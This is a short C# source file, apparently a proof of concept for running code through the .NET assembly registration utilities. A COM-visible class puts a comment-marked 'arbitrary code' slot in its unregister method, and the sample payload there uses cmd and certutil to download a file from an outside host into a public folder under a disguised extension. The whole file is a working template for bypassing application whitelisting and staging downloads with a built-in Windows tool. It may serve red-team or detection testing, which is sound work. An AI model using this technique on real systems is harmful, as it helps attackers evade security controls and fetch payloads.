using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


[ComVisible(true)]
public class Sample
{
    //Any function name works
    [ComUnregisterFunction] 
    public static void Unregister(string str)
    {
	//Arbitrary code inserted here
        Process.Start("cmd /c certutil.exe -urlcache -split -f  https://www.google.com/robots.txt C:\\Users\\Public\\robots.txe"); 
    }
}